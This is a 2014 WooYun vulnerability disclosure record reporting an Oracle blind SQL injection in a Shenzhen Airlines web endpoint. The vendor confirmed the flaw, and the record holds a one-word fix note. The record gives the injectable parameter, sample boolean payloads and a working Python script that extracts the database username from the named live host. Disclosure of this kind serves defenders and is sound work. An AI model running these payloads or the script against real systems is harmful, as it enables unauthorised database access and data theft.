{"id": 48593, "wybug_id": "wooyun-2014-082564", "wybug_title": "深航某站点存在Oracle盲注附验证python脚本", "wybug_corp": "深圳航空", "wybug_author": "lijiejie", "wybug_date": "2014-11-08 21:22", "wybug_open_date": "2014-12-23 21:24", "wybug_type": "SQL注射漏洞", "wybug_level": "中", "wybug_rank_0": "8", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-11-08：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-11-11：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-11-21：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-12-01：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-12-11：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-12-23：\t细节向公众公开  简要描述： 深航某站点存在Oracle盲注，附验证python脚本 详细说明：  注入点：\nPOST http://miaosha.shenzhenair.com/module/hyfw/inc_flightsegment.jspdstcity=BAV&orgcity=AEB' AND length(SYS_CONTEXT('USERENV','CURRENT_USER'))=13 AND 'aaa'='aaa\nbool盲注。如果页面返回到达地“广州”，表示True。以上请求是确认数据库用户的长度为13。若使用注释符号，变为：\ndstcity=BAV&orgcity=AEB' AND length(SYS_CONTEXT('USERENV','CURRENT_USER'))=13--\n那么为True时，出现的应该是到达地“桂林”。如图：\n\n   漏洞证明：  暂未测试UTL_HTTP.request是否可用，比较喜欢盲注。暴力猜解实际可以二分，此处做了简化。得到当前用户：\nB2CSHEBENTER\n\n\npython脚本：\n#encoding=gbkimport httplibimport timeimport stringimport sysimport randomimport urllibheaders = {    'Content-Type': 'application/x-www-form-urlencoded',    'Cookie': '',    'User-Agent': 'Mozilla/5.0 (Linux; U; Android 2.3.6; en-us; Nexus S Build/GRK39F) AppleWebKit/533.1 (KHTML, like Gecko) Version/4.0 Mobile Safari/533.1',}payloads = list(string.ascii_lowercase)payloads += list(string.ascii_uppercase)for i in range(0,10):    payloads.append(str(i))    print 'start to retrive Oracle user:'user = ''for i in range(1,14,1):    for payload in payloads:        conn = httplib.HTTPConnection('miaosha.shenzhenair.com', timeout=30)        params = {            'dstcity': 'BAV',            'orgcity': \"AEB' AND ascii(substr(SYS_CONTEXT('USERENV','CURRENT_USER'),%s,1))=%s--\" % (i, ord(payload))            }        conn.request(method='POST',                     url='/module/hyfw/inc_flightsegment.jsp',                     body = urllib.urlencode(params),                     headers = headers)        start_time = time.time()        html_doc = conn.getresponse().read().decode('gbk')        conn.close()        print '.',        if html_doc.find(u'<option value=\"KWL\" >G-桂林</option>') > 0:  # true            user += payload            print '\\n[in progress]', user            breakprint '\\nOracle user is', user\n   修复方案：  编码   版权声明：转载请注明来源 lijiejie@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2014-11-11 13:41 厂商回复： 感谢您对深航系统的关系，已安排人员修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}